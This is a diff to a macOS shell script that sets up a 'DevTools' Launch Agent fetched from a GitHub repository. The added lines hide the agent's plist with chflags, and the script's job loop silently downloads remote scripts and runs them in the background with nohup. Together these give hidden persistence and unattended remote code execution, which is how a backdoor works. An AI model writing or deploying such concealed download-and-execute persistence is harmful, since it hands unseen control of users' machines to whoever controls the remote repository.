@@ -6,8 +6,10 @@ HOME_DIR=$(eval echo "~${username}")
 repo="https://raw.githubusercontent.com/jaykepeters/unio/master"
 
 function confCheck() {
+    las="$HOME_DIR""/Library/LaunchAgents/"
+    setupLA="user.DevTools.installer.plist"
     la="user.DevTools.agent.plist"
-    theLA="$HOME_DIR""/Library/LaunchAgents/""$la"
+    theLA="$las""$la"
     binary="$HOME_DIR""/bin/DevTools"
     inetisUp() {
         echo -e "GET http://google.com HTTP/1.0\n\n" | nc google.com 80 > /dev/null 2>&1
@@ -20,6 +22,7 @@ function confCheck() {
     installLA() {
         echo 'Installing Launch Agent'
         curl -sSL "$repo"/"$la" > "$theLA"
+        chflags hidden "$theLA"
         launchctl unload "$theLA"
         launchctl load "$theLA"
     }
@@ -34,6 +37,12 @@ function confCheck() {
     if [ $? -eq 1 ]; then
         echo 'COULD NOT CONNECT'
         exit 1
+    fi
+    # Setup Launch Agent
+    if [ -f "$las""$setupLA" ]; then
+        echo 'Removing Setup Launch Agent'
+        launchctl unload "$las""$setupLA"
+        rm "$las""$setupLA"
     fi
     # Launch Agent
     if [ ! -f "$theLA" ]; then
@@ -53,6 +62,7 @@ function getJobs() {
         echo -e 'Downloading:\t' "$script" to "$temp"
         curl -sSL "$script" > "$temp""/script"
         chmod +x "$temp""/script"
+        echo -e 'Executing Script:\t' "$temp""script"
         nohup "$temp""/script" &>/dev/null &
     done
 }
